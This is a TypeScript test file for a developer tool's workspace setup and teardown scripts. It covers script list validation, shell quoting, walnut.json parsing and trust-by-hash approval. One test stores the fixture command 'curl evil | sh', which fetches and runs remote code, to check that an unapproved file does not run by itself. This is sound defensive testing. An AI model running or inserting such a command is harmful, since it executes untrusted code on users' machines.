/**
 * Project scripts, server half (src/core/workspaces/scripts.ts): the lists
 * (project + repository file), the setup run after a workspace is made (waiting
 * or not, failing, an older daemon, a restart), the teardown at completion, the
 * guards, and the session prompt line. The daemon, the store and the clock are
 * fakes; workspace-core.test.ts runs the host side for real.
 */
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import type { Task } from '../../src/core/types.js'
import type { ResolvedProjectScript, TaskWorkspace } from '../../src/core/workspaces/types.js'
import { __setWorkspacePluginSourceForTesting } from '../../src/core/workspaces/registry.js'
import { WorkspaceError } from '../../src/core/workspaces/daemon-client.js'
import {
  __setWorkspaceManagerDepsForTesting, __settleWorkspaceDriver, deferStart, removeWorkspaceManually, requestWorkspace, launchPending, cancelPendingStart,
} from '../../src/core/workspaces/manager.js'
import { __settleCompletionCheck, onTaskCompleted, onTaskDeleted, resumeWorkspaces } from '../../src/core/workspaces/cleanup.js'
import {
  fileHash, parseScriptsFile, rerunSetup, startAnyway, trustKey, sanitizeProjectScripts, scriptFor, scriptsFor, setupPromptLine, storedProjectScripts,
} from '../../src/core/workspaces/scripts.js'
import { cleanTrust, withTrust } from '../../src/core/workspaces/scripts-trust.js'
import { scriptTerminalLine, scriptTerminalRun, shellQuote } from '../../src/core/workspaces/script-line.js'
import { workspaceHoldAsk } from '../../src/core/workspaces/decisions.js'
import { deriveUserStatus } from '../../src/core/user-status.js'

const HOME = '/data/walnut-a'

describe('script lists', () => {
  it('the project list: valid entries, unique names, one setup and one teardown, stable ids', () => {
    const ok = sanitizeProjectScripts([
      { name: ' Install ', command: ' bun install ', setup: true, wait: false },
      { name: 'Test', command: 'bun run test\r\n', timeout_sec: 99999 },
      { name: 'Clean', command: 'rm -rf dist', teardown: true, id: 'keep-me' },
    ])
    expect(ok).toEqual([
      { id: 'install', name: 'Install', command: 'bun install', setup: true, wait: false },
      { id: 'test', name: 'Test', command: 'bun run test', timeout_sec: 3600 },
      { id: 'keep-me', name: 'Clean', command: 'rm -rf dist', teardown: true },
    ])
    expect(sanitizeProjectScripts([{ name: 'a', command: 'x' }, { name: 'A', command: 'y' }])).toBe('Two scripts are named "A"')
    expect(sanitizeProjectScripts([{ name: 'a', command: 'x', setup: true }, { name: 'b', command: 'y', setup: true }])).toBe('Only one script can run when a workspace is made')
    expect(sanitizeProjectScripts([{ name: 'a', command: 'x', teardown: true }, { name: 'b', command: 'y', teardown: true }])).toBe('Only one script can run when the task completes')
    expect(sanitizeProjectScripts([{ name: '', command: 'x' }])).toBe('Script 1 needs a name')
    expect(sanitizeProjectScripts([{ name: 'x', command: '   ' }])).toBe('"x" needs a command')
    expect(sanitizeProjectScripts([{ name: 'x', command: 'y', timeout_sec: 'soon' }])).toMatch(/time limit/)
    expect(sanitizeProjectScripts('nope')).toBe('scripts must be a list')
    expect(sanitizeProjectScripts(Array.from({ length: 33 }, (_, i) => ({ name: `s${i}`, command: 'x' })))).toMatch(/at most 32/)
    // wait only means something for a setup script.
    expect(sanitizeProjectScripts([{ name: 'x', command: 'y', wait: false }])).toEqual([{ id: 'x', name: 'x', command: 'y' }])
    // Two names with the same slug still get two ids.
    const ids = sanitizeProjectScripts([{ name: 'Dev server', command: 'a' }, { name: 'dev-server', command: 'b' }]) as Array<{ id: string }>
    expect(ids.map((s) => s.id)).toEqual(['dev-server', 'dev-server-2'])
  })

  it('a damaged stored list drops only the bad entries', () => {
    expect(storedProjectScripts([{ name: 'a', command: 'x' }, { name: '', command: 'y' }, 7, { name: 'b', command: 'z' }]).map((s) => s.name)).toEqual(['a', 'b'])
    expect(storedProjectScripts(undefined)).toEqual([])
  })

  it('walnut.json: its own field names; bad entries are skipped with a warning', () => {
    const p = parseScriptsFile('walnut.json', JSON.stringify({ scripts: [
      { name: 'Install', command: 'bun install', setup: true },
      { name: 'Install', command: 'npm i' },
      { name: 'Seed', command: 'x', setup: true },
      { name: '', command: 'x' },
      { name: 'Down', command: 'docker compose down', teardown: true },
    ] }))
    expect(p.error).toBeUndefined()
    expect(p.scripts).toEqual([
      { id: 'file-install', name: 'Install', command: 'bun install', setup: true },
      { id: 'file-seed', name: 'Seed', command: 'x' },
      { id: 'file-down', name: 'Down', command: 'docker compose down', teardown: true },
    ])
    expect(p.warnings).toEqual(['"Install" appears twice; the first one is used', '"Seed": only the first setup script runs', 'Script 4 needs a name'])
    expect(parseScriptsFile('walnut.json', '{ nope').error).toMatch(/^walnut.json is not valid JSON/)
    expect(parseScriptsFile('walnut.json', '[]').error).toBe('walnut.json must hold an object')
    expect(parseScriptsFile('walnut.json', '{"scripts":{}}').error).toBe('"scripts" in walnut.json must be a list')
    expect(parseScriptsFile('walnut.json', '{"name":"x"}')).toEqual({ scripts: [], warnings: [] })
  })

  it("the project's setup and teardown win over the file's", () => {
    const list: ResolvedProjectScript[] = [
      { id: 'a', name: 'A', command: 'a', source: 'project' },
      { id: 'f', name: 'F', command: 'f', setup: true, teardown: true, source: 'walnut.json' },
      { id: 'p', name: 'P', command: 'p', setup: true, source: 'project' },
    ]
    expect(scriptFor('setup', list)?.id).toBe('p')
    expect(scriptFor('teardown', list)?.id).toBe('f')
    expect(scriptFor('setup', [list[0]])).toBeNull()
  })

  it('the terminal line runs in a subshell at the folder, any text quoted', () => {
    expect(scriptTerminalLine('bun run test', '/w/app')).toBe("(trap 'exit 130' INT; cd '/w/app' || exit 1; bun run test)")
    expect(scriptTerminalLine('echo hi', undefined)).toBe("(trap 'exit 130' INT; echo hi)")
    expect(scriptTerminalRun("it's", 'true', '/w')).toBe(`(trap 'exit 130' INT; cd '/w' || exit 1; true); printf '\\n\\033[1m[%s exited with %s]\\033[0m\\n' 'it'\\''s' "$?"`)
    expect(scriptTerminalRun('T', 'true', undefined, 'r1')).toBe(`printf '\\033]1337;walnut-run-start=%s\\007' 'r1'; (trap 'exit 130' INT; true); printf '\\n\\033]1337;walnut-run=%s\\007\\033[1m[%s exited with %s]\\033[0m\\n' 'r1' 'T' "$?"`)
    expect(scriptTerminalLine('a\r\nb', "/w/it's")).toBe("(trap 'exit 130' INT; cd '/w/it'\\''s' || exit 1; \"${SHELL:-sh}\" -c 'a\nb')")
    // A comment goes to a non-interactive shell (an interactive zsh would pass it as arguments).
    expect(scriptTerminalLine("npm test # it's unit", '/w/app')).toBe("(trap 'exit 130' INT; cd '/w/app' || exit 1; \"${SHELL:-sh}\" -c 'npm test # it'\\''s unit')")
    expect(shellQuote("x'y")).toBe("'x'\\''y'")
  })

  it('the terminal line in a real shell: a comment, a list, a folder that is gone', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'script-line-'))
    try {
      const sh = (line: string) => execFileSync('sh', ['-c', `${line}\necho after`], { encoding: 'utf8', env: { ...process.env, SHELL: '/bin/sh' } })
      expect(sh(scriptTerminalLine('echo here # a comment )', dir))).toBe('here\nafter\n')
      expect(sh(scriptTerminalLine('echo one; echo two', dir))).toBe('one\ntwo\nafter\n')
      expect(sh(scriptTerminalRun('Fail', 'exit 3', dir))).toBe('\n\x1b[1m[Fail exited with 3]\x1b[0m\nafter\n')
      expect(sh(scriptTerminalRun('Fail', 'exit 3', dir, 'r9'))).toBe('\x1b]1337;walnut-run-start=r9\x07\n\x1b]1337;walnut-run=r9\x07\x1b[1m[Fail exited with 3]\x1b[0m\nafter\n')
      // Ctrl-C (SIGINT to the subshell) still ends with its line, and 130.
      expect(sh(scriptTerminalRun('Dev', "sh -c 'kill -INT $PPID'; sleep 5", dir))).toBe('\n\x1b[1m[Dev exited with 130]\x1b[0m\nafter\n')
      expect(sh(scriptTerminalLine("echo 'a b'\necho \"$PWD\" # here", dir))).toBe(`a b\n${dir}\nafter\n`)
      // Interactive zsh, where `#` is no comment by default (when it is installed).
      let zsh = ''
      try { zsh = execFileSync('sh', ['-c', 'command -v zsh'], { encoding: 'utf8' }).trim() } catch { /* none */ }
      if (zsh) {
        const out = execFileSync(zsh, ['-f', '-i', '-c', scriptTerminalLine('echo kept # dropped', dir)], { encoding: 'utf8', env: { ...process.env, SHELL: '/bin/sh' } })
        expect(out.trim().split('\n').pop()).toBe('kept')
      }
      // cd fails: neither half of `a; b` or `a || b` runs, and the terminal goes on.
      const gone = path.join(dir, 'gone')
      expect(sh(`${scriptTerminalLine('echo one; echo two', gone)} 2>/dev/null`)).toBe('after\n')
      expect(sh(`${scriptTerminalLine('false || echo fallback', gone)} 2>/dev/null`)).toBe('after\n')
    } finally {
      fs.rmSync(dir, { recursive: true, force: true })
    }
  })

  it('the allowed files list: valid hashes only, newest kept, one entry per hash', () => {
    expect(cleanTrust({ allowed: ['abc', 'a'.repeat(32), 7, 'b'.repeat(32)] })).toEqual(['a'.repeat(32), 'b'.repeat(32)])
    expect(cleanTrust(null)).toEqual([])
    expect(withTrust(['a'.repeat(32), 'b'.repeat(32)], 'a'.repeat(32))).toEqual(['b'.repeat(32), 'a'.repeat(32)])
    expect(fileHash('{"scripts":[]}')).toMatch(/^[a-f0-9]{32}$/)
    expect(fileHash('{"scripts":[]}')).not.toBe(fileHash('{"scripts": []}'))
  })
})

// ── runs, over a fake store + daemon ──

interface ScriptJob { state: 'running' | 'done' | 'failed'; result?: Record<string, unknown>; error?: string; progress?: string }

interface Fake {
  tasks: Map<string, Task>
  calls: Array<{ cmd: string; params: Record<string, unknown> }>
  jobs: Map<string, ScriptJob | Record<string, unknown> | null>
  launched: string[]
  meta: Record<string, Record<string, unknown>>
  file: { name: string; path: string; content: string } | null
  /** What `workspace.runScript` answers (default: ok, the job runs until the test settles it). */
  runReply?: Record<string, unknown>
  /** The daemon is older than workspace-scripts-v1. */
  oldDaemon: boolean
  live: boolean
  /** The walnut.json keys the user allowed. */
  trust: string[]
  /** The repository the host reports for the file (its common git dir). */
  repo: string
}

/** The user allowed the fake's current walnut.json, in its repository. */
function allowFile(f: Fake): void {
  f.trust.push(trustKey('__local__', f.repo, fileHash(f.file!.content)))
}

let current: Fake | null = null

function fake(): Fake {
  const f: Fake = { tasks: new Map(), calls: [], jobs: new Map(), launched: [], meta: {}, file: null, oldDaemon: false, live: false, trust: [], repo: '/r/repo/.git' }
  current = f
  let n = 0
  __setWorkspacePluginSourceForTesting(async () => [])
  __setWorkspaceManagerDepsForTesting({
    getTask: async (id) => (f.tasks.has(id) ? structuredClone(f.tasks.get(id)!) : null),
    write: async (id, fn) => {
      const t = f.tasks.get(id)
      if (!t) return null
      const next = fn(t.workspace, t)
      if (!next) return null
      const updated = { ...t, workspace: next }
      f.tasks.set(id, updated)
      return structuredClone(updated)
    },
    rpc: async (_host, cmd, params) => {
      f.calls.push({ cmd, params })
      if ((cmd === 'workspace.scriptsFile' || cmd === 'workspace.runScript') && f.oldDaemon) {
        throw new WorkspaceError('The Walnut daemon on this Mac needs an update before it can run project scripts.', 409, 'daemon-upgrade')
      }
      if (cmd === 'workspace.create') {
        f.jobs.set(String(params.jobId), { state: 'running', progress: 'Creating branch' })
        return { ok: true, jobId: params.jobId, state: 'running' }
      }
      if (cmd === 'workspace.scriptsFile') return { ok: true, dir: params.dir, repo: f.repo, file: f.file }
      if (cmd === 'workspace.runScript') {
        if (f.runReply) return f.runReply
        f.jobs.set(String(params.jobId), { state: 'running', progress: 'Resolving packages' })
        return { ok: true, jobId: params.jobId, state: 'running' }
      }
      if (cmd === 'workspace.job') return { ok: true, job: f.jobs.has(String(params.jobId)) ? f.jobs.get(String(params.jobId)) : null }
      if (cmd === 'workspace.status') return { ok: true, probe: { rootExists: true, clean: true, merged: true, problems: [], repos: [] } }
      if (cmd === 'workspace.remove') {
        f.jobs.set(String(params.jobId), { state: 'done', result: { removed: true } })
        return { ok: true, jobId: params.jobId, state: 'running' }
      }
      return { ok: false, error: 'unexpected ' + cmd }
    },
    launch: async (task) => { f.launched.push(task.id) },
    sessionBusy: async () => false,
    hasLiveSession: async () => f.live,
    notify: async () => {},
    listTasks: async () => [...f.tasks.values()],
    projectMeta: async (project) => f.meta[project] ?? null,
    scriptsTrust: async () => [...f.trust],
    allowScriptsFile: async (hash) => { f.trust.push(hash); return [...f.trust] },
    walnutHome: async () => HOME,
    cloudMode: () => false,
    now: () => 1_700_000_000_000,
    sleep: async () => { await new Promise((r) => setImmediate(r)) },
    jobId: () => `job-${++n}`,
  })
  return f
}

async function tick(times = 1): Promise<void> {
  for (let i = 0; i < times; i++) await new Promise((r) => setImmediate(r))
}

async function until(cond: () => boolean, what: string): Promise<void> {
  for (let i = 0; i < 400; i++) {
    if (cond()) return
    await tick()
  }
  throw new Error(`never happened: ${what}`)
}

/** End every job a test left running, so no driver outlives the fakes. */
afterEach(async () => {
  const f = current
  if (f) {
    for (const [id, job] of f.jobs) if ((job as ScriptJob | null)?.state === 'running') f.jobs.set(id, { state: 'failed', error: 'test over' })
    for (const id of f.tasks.keys()) await __settleWorkspaceDriver(id)
    await tick(20)
  }
  current = null
  __setWorkspacePluginSourceForTesting(null)
  __setWorkspaceManagerDepsForTesting(null)
})

function addTask(f: Fake, t: Partial<Task> & { id: string }): Task {
  const task = { title: 'Fix parser', status: 'todo', phase: 'TODO', project: 'Acme', priority: 'none', created_at: '', updated_at: '', source: 'local', cwd: '/r/repo', ...t } as unknown as Task
  f.tasks.set(task.id, task)
  return task
}

const READY = { state: 'done', result: { root: '/w/repo/x', cwd: '/w/repo/x', branch: 'walnut/x', sourceRepo: '/r/repo', repos: [{ path: '/w/repo/x' }] } }

/** Request a workspace with a waiting start and let the host finish making it. */
async function made(f: Fake, id: string): Promise<void> {
  await requestWorkspace(id, { provider: 'git-worktree', anchor: '/r/repo', pending: { via: 'task-start', message: 'go', at: 'now' } })
  const jobId = f.tasks.get(id)!.workspace!.job_id!
  // Settle the job only once the host was asked, or the start would overwrite it.
  await until(() => f.calls.some((c) => c.cmd === 'workspace.create' && c.params.jobId === jobId), 'create asked')
  f.jobs.set(jobId, READY)
}

function runCall(f: Fake) {
  return f.calls.filter((c) => c.cmd === 'workspace.runScript')
}

function ws(f: Fake, id: string): TaskWorkspace {
  return f.tasks.get(id)!.workspace!
}

describe('setup after a workspace is made', () => {
  let f: Fake
  beforeEach(() => { f = fake() })

  it('a waiting setup holds the first session until it ends, with progress on the row', async () => {
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Install', command: 'bun install', setup: true }] }) }
    allowFile(f)
    addTask(f, { id: 'w1' })
    await made(f, 'w1')
    await until(() => runCall(f).length === 1, 'setup started')
    expect(f.calls.find((c) => c.cmd === 'workspace.scriptsFile')!.params).toEqual({ dir: '/w/repo/x' })
    expect(runCall(f)[0].params).toMatchObject({
      provider: 'git-worktree', root: '/w/repo/x', cwd: '/w/repo/x', command: 'bun install', timeoutSec: 900,
      env: { WALNUT_TASK_ID: 'w1', WALNUT_SCRIPT_TRIGGER: 'setup', WALNUT_WORKSPACE_ROOT: '/w/repo/x', WALNUT_SOURCE_REPO: '/r/repo', WALNUT_BRANCH: 'walnut/x' },
    })
    await until(() => ws(f, 'w1').setup?.progress === 'Resolving packages', 'progress recorded')
    expect(ws(f, 'w1')).toMatchObject({ state: 'ready', setup: { name: 'Install', command: 'bun install', source: 'walnut.json', state: 'running', wait: true } })
    expect(f.launched).toEqual([])
    // A start retried meanwhile still waits.
    await launchPending('w1')
    expect(f.launched).toEqual([])
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 42_000, output: 'added 12 packages\n' } })
    await __settleWorkspaceDriver('w1')
    expect(ws(f, 'w1').setup).toMatchObject({ state: 'done', exit_code: 0, output: 'added 12 packages' })
    expect(ws(f, 'w1').setup!.progress).toBeUndefined()
    expect(ws(f, 'w1').setup!.ended_at).toBeTruthy()
    expect(f.launched).toEqual(['w1'])
    expect(ws(f, 'w1').pending_start).toBeUndefined()
  })

  it('the project setup wins over the file; one that does not wait lets the session start at once', async () => {
    f.meta.Acme = { scripts: [{ name: 'Prepare', command: 'make deps', setup: true, wait: false }] }
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Install', command: 'bun install', setup: true }] }) }
    addTask(f, { id: 'w2' })
    await made(f, 'w2')
    await __settleWorkspaceDriver('w2')
    expect(f.launched).toEqual(['w2'])
    expect(runCall(f).map((c) => c.params.command)).toEqual(['make deps'])
    expect(ws(f, 'w2').setup).toMatchObject({ state: 'running', wait: false, source: 'project' })
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 10 } })
    await until(() => ws(f, 'w2').setup?.state === 'done', 'setup ended')
  })

  it("a failing setup is recorded with its output and holds a person's start until they choose", async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'w3' })
    await made(f, 'w3')
    await until(() => runCall(f).length === 1, 'setup started')
    const long = 'x'.repeat(9000) + '\nerror: lockfile had changes'
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 1, ms: 3000, output: long } })
    await __settleWorkspaceDriver('w3')
    const run = ws(f, 'w3').setup!
    expect(run).toMatchObject({ state: 'failed', exit_code: 1, error: 'exited with code 1' })
    expect(run.output!.length).toBeLessThanOrEqual(4001)
    expect(run.output!.endsWith('error: lockfile had changes')).toBe(true)
    // A person started it: the session waits for their choice, and the task says so as Needs you.
    expect(f.launched).toEqual([])
    expect(ws(f, 'w3').pending_start).toBeTruthy()
    const ask = workspaceHoldAsk(ws(f, 'w3'))
    expect(ask).toMatch(/^Its setup Install failed \(exited with code 1\): run it again, or start the session anyway\.$/)
    expect(deriveUserStatus({ phase: 'TODO', hasSession: false, workspaceHold: ask }, Date.now())).toMatchObject({ state: 'needs', source: 'error', ask })
    await launchPending('w3')
    expect(f.launched).toEqual([])
    await startAnyway('w3')
    await until(() => f.launched.length === 1, 'started anyway')
    expect(ws(f, 'w3').setup?.proceed).toBe(true)
    await expect(startAnyway('w3')).rejects.toThrow(/Nothing waits for setup/)
    expect(workspaceHoldAsk(ws(f, 'w3'))).toBeNull()
    expect(setupPromptLine(ws(f, 'w3'))).toMatch(/failed \(exited with code 1\)\. Its output ended with:\n```\n[\s\S]*lockfile had changes\n```/)
  })

  it("an agent's start goes on after a failed setup (nobody may be there to choose); Run setup again holds a waiting start", async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'w10' })
    await requestWorkspace('w10', { provider: 'git-worktree', anchor: '/r/repo', pending: { via: 'task-start', message: 'go', at: 'now', caller_sid: 'lead-session' } })
    const jobId = f.tasks.get('w10')!.workspace!.job_id!
    await until(() => f.calls.some((c) => c.cmd === 'workspace.create' && c.params.jobId === jobId), 'create asked')
    f.jobs.set(jobId, READY)
    await until(() => runCall(f).length === 1, 'setup started')
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 2, ms: 5 } })
    await __settleWorkspaceDriver('w10')
    expect(f.launched).toEqual(['w10'])
    // A person's start held by a failed setup: running it again holds it too, and its success starts it.
    addTask(f, { id: 'w11' })
    await made(f, 'w11')
    await until(() => runCall(f).length === 2, 'setup started')
    f.jobs.set(String(runCall(f)[1].params.jobId), { state: 'done', result: { exitCode: 1, ms: 5 } })
    await __settleWorkspaceDriver('w11')
    expect(f.launched).toEqual(['w10'])
    await rerunSetup('w11')
    expect(ws(f, 'w11').setup).toMatchObject({ state: 'running', wait: true })
    f.jobs.set(String(runCall(f)[2].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await until(() => f.launched.length === 2, 'started after the rerun succeeded')
  })

  it('a timeout and a lost job are failures with a reason', async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'sleep 9999', setup: true, timeout_sec: 5 }] }
    addTask(f, { id: 'w4' })
    await made(f, 'w4')
    await until(() => runCall(f).length === 1, 'setup started')
    expect(runCall(f)[0].params.timeoutSec).toBe(5)
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: null, signal: 'SIGKILL', timedOut: true, ms: 5000 } })
    await __settleWorkspaceDriver('w4')
    expect(ws(f, 'w4').setup).toMatchObject({ state: 'failed', timed_out: true, error: 'timed out after 5s' })
    // Run setup again, and the daemon forgets the job (it restarted).
    await rerunSetup('w4')
    expect(ws(f, 'w4').setup).toMatchObject({ state: 'running' })
    f.jobs.set(String(runCall(f)[1].params.jobId), null)
    await until(() => ws(f, 'w4').setup?.state === 'failed', 'lost job recorded')
    expect(ws(f, 'w4').setup!.error).toMatch(/has no record of this job/)
  })

  it('an older daemon skips setup only when there is one; the session starts', async () => {
    f.oldDaemon = true
    addTask(f, { id: 'w5' })
    await made(f, 'w5')
    await __settleWorkspaceDriver('w5')
    expect(ws(f, 'w5').setup).toBeUndefined()
    expect(f.launched).toEqual(['w5'])
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'w6' })
    await made(f, 'w6')
    await __settleWorkspaceDriver('w6')
    expect(ws(f, 'w6').setup).toMatchObject({ state: 'skipped', error: expect.stringMatching(/needs an update/) })
    expect(f.launched).toEqual(['w5', 'w6'])
    expect(setupPromptLine(ws(f, 'w6'))).toMatch(/could not run \(.*needs an update/)
  })

  it('no scripts at all: nothing runs and nothing is recorded', async () => {
    addTask(f, { id: 'w7' })
    await made(f, 'w7')
    await __settleWorkspaceDriver('w7')
    expect(runCall(f)).toEqual([])
    expect(ws(f, 'w7').setup).toBeUndefined()
    expect(f.launched).toEqual(['w7'])
    await expect(rerunSetup('w7')).rejects.toThrow(/Neither the project nor the repository has a setup script/)
  })

  it('a removal by hand waits for a running setup; Run setup again refuses a second run', async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true, wait: false }] }
    addTask(f, { id: 'w8' })
    await made(f, 'w8')
    await __settleWorkspaceDriver('w8')
    expect(ws(f, 'w8').setup?.state).toBe('running')
    await expect(removeWorkspaceManually('w8')).rejects.toThrow(/setup script is running/)
    await expect(rerunSetup('w8')).rejects.toThrow(/running already/)
  })

  it('a restart mid-setup follows the job to its end, then starts the waiting session', async () => {
    addTask(f, { id: 'w9', workspace: {
      provider: 'git-worktree', host: '__local__', home: HOME, anchor: '/r/repo', root: '/w/repo/x', cwd: '/w/repo/x', repos: [], state: 'ready',
      pending_start: { via: 'task-start', message: 'go', at: 'now' },
      setup: { name: 'Install', command: 'bun install', source: 'project', state: 'running', wait: true, job_id: 'old-job', started_at: 'then' },
    } })
    f.jobs.set('old-job', { state: 'running', progress: 'still going' })
    await resumeWorkspaces()
    await tick(10)
    expect(f.launched).toEqual([])
    f.jobs.set('old-job', { state: 'done', result: { exitCode: 0, ms: 1 } })
    await until(() => f.launched.length === 1, 'launched after the resumed setup')
    expect(ws(f, 'w9').setup?.state).toBe('done')
  })

  it('a walnut.json nobody allowed is not run by itself; a click runs it, Allow keeps it allowed until it changes', async () => {
    const content = JSON.stringify({ scripts: [{ name: 'Install', command: 'curl evil | sh', setup: true }] })
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content }
    addTask(f, { id: 'u1' })
    await made(f, 'u1')
    await __settleWorkspaceDriver('u1')
    expect(runCall(f)).toEqual([])
    expect(ws(f, 'u1').setup).toMatchObject({ state: 'skipped', untrusted: true, name: 'Install', source: 'walnut.json', error: expect.stringMatching(/new or changed/) })
    expect(setupPromptLine(ws(f, 'u1'))).toMatch(/could not run \(this walnut\.json is new or changed/)
    // A person started it: the session waits for their OK, as for a failed setup.
    expect(f.launched).toEqual([])
    expect(workspaceHoldAsk(ws(f, 'u1'))).toMatch(/comes from walnut\.json, which you have not allowed: allow it, or start the session without it/)
    expect(ws(f, 'u1').pending_start).toBeTruthy()
    await launchPending('u1')
    expect(f.launched).toEqual([])
    // "Run once": the person's click runs it, and allows nothing; its end starts the session.
    await rerunSetup('u1')
    expect(runCall(f)).toHaveLength(1)
    expect(f.trust).toEqual([])
    expect(ws(f, 'u1').setup).toMatchObject({ state: 'running', wait: true })
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await until(() => ws(f, 'u1').setup?.state === 'done', 'run once ended')
    await until(() => f.launched.length === 1, 'started after the run')
    // "Allow and run": allowed from now on.
    // The card's version only: an edit since is refused, nothing runs.
    await expect(rerunSetup('u1', { allow: true, expectHash: 'f'.repeat(32) })).rejects.toThrow(/changed since; nothing ran/)
    expect(runCall(f)).toHaveLength(1)
    await rerunSetup('u1', { allow: true, expectHash: fileHash(content) })
    expect(f.trust).toEqual([trustKey('__local__', '/r/repo/.git', fileHash(content))])
    // A run again holds no start once the session started.
    expect(ws(f, 'u1').setup).toMatchObject({ state: 'running', wait: false })
    f.jobs.set(String(runCall(f)[1].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await until(() => ws(f, 'u1').setup?.state === 'done', 'allowed run ended')
    // The next workspace with the same file runs it by itself.
    addTask(f, { id: 'u2' })
    await made(f, 'u2')
    await until(() => runCall(f).length === 3, 'allowed file ran by itself')
    f.jobs.set(String(runCall(f)[2].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await __settleWorkspaceDriver('u2')
    expect(ws(f, 'u2').setup).toMatchObject({ state: 'done' })
    // An edited file asks again.
    f.file = { ...f.file, content: content.replace('evil', 'worse') }
    addTask(f, { id: 'u3' })
    await made(f, 'u3')
    await __settleWorkspaceDriver('u3')
    expect(runCall(f)).toHaveLength(3)
    expect(ws(f, 'u3').setup).toMatchObject({ state: 'skipped', untrusted: true, file_hash: fileHash(f.file.content) })
    // The same bytes in another repository ask again too (they run its own package.json, its setup.sh).
    f.file = { ...f.file, content }
    f.repo = '/r/other/.git'
    addTask(f, { id: 'u5' })
    await made(f, 'u5')
    await __settleWorkspaceDriver('u5')
    expect(runCall(f)).toHaveLength(3)
    expect(ws(f, 'u5').setup).toMatchObject({ state: 'skipped', untrusted: true })
  })

  it("a walnut.json nobody allowed: Start without it starts the session; an agent's start never waits for the OK", async () => {
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Install', command: 'bun install', setup: true }] }) }
    addTask(f, { id: 'u6' })
    await made(f, 'u6')
    await __settleWorkspaceDriver('u6')
    expect(f.launched).toEqual([])
    await startAnyway('u6')
    await until(() => f.launched.length === 1, 'started without it')
    expect(runCall(f)).toEqual([])
    expect(ws(f, 'u6').setup).toMatchObject({ state: 'skipped', untrusted: true, proceed: true })
    addTask(f, { id: 'u7' })
    await requestWorkspace('u7', { provider: 'git-worktree', anchor: '/r/repo', pending: { via: 'task-start', message: 'go', at: 'now', caller_sid: 'lead-session' } })
    const jobId = f.tasks.get('u7')!.workspace!.job_id!
    await until(() => f.calls.some((c) => c.cmd === 'workspace.create' && c.params.jobId === jobId), 'create asked')
    f.jobs.set(jobId, READY)
    await until(() => f.launched.length === 2, "the agent's start went on")
    expect(ws(f, 'u7').setup).toMatchObject({ state: 'skipped', untrusted: true })
    expect(workspaceHoldAsk(ws(f, 'u7'))).toBeNull()
  })

  it('a held start is let go when a session of the task started some other way, or when the person dismisses it', async () => {
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Install', command: 'bun install', setup: true }] }) }
    addTask(f, { id: 'u8' })
    await made(f, 'u8')
    await __settleWorkspaceDriver('u8')
    expect(workspaceHoldAsk(ws(f, 'u8'))).toBeTruthy()
    f.live = true
    await launchPending('u8')
    expect(ws(f, 'u8').pending_start).toBeUndefined()
    expect(workspaceHoldAsk(ws(f, 'u8'))).toBeNull()
    expect(f.launched).toEqual([])
    f.live = false
    addTask(f, { id: 'u9' })
    await made(f, 'u9')
    await __settleWorkspaceDriver('u9')
    expect(workspaceHoldAsk(ws(f, 'u9'))).toBeTruthy()
    await cancelPendingStart('u9')
    expect(ws(f, 'u9').pending_start).toBeUndefined()
    expect(workspaceHoldAsk(ws(f, 'u9'))).toBeNull()
    await launchPending('u9')
    expect(f.launched).toEqual([])
  })

  it("the project's own setup runs without asking", async () => {
    f.meta.Acme = { scripts: [{ name: 'Prepare', command: 'make deps', setup: true }] }
    addTask(f, { id: 'u4' })
    await made(f, 'u4')
    await until(() => runCall(f).length === 1, 'project setup started')
    expect(ws(f, 'u4').setup).toMatchObject({ state: 'running', source: 'project' })
  })

  it('a start asked while a waiting setup runs waits for it too (task_start, quick-start on the task)', async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'd1' })
    await made(f, 'd1')
    await until(() => runCall(f).length === 1, 'setup started')
    await until(() => ws(f, 'd1').state === 'ready', 'ready')
    await deferStart('d1', { via: 'task-start', message: 'second start', at: 'later' })
    expect(ws(f, 'd1').pending_start).toMatchObject({ message: 'second start' })
    expect(f.launched).toEqual([])
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await __settleWorkspaceDriver('d1')
    expect(f.launched).toEqual(['d1'])
    expect(ws(f, 'd1').pending_start).toBeUndefined()
  })

  it('a start that was planned to wait, arriving after the setup ended, starts at once', async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'd4' })
    await made(f, 'd4')
    await until(() => runCall(f).length === 1, 'setup started')
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await __settleWorkspaceDriver('d4')
    expect(f.launched).toEqual(['d4'])
    await deferStart('d4', { via: 'quick-start', message: 'late', at: 'later' })
    await until(() => f.launched.length === 2, 'the late start went')
  })

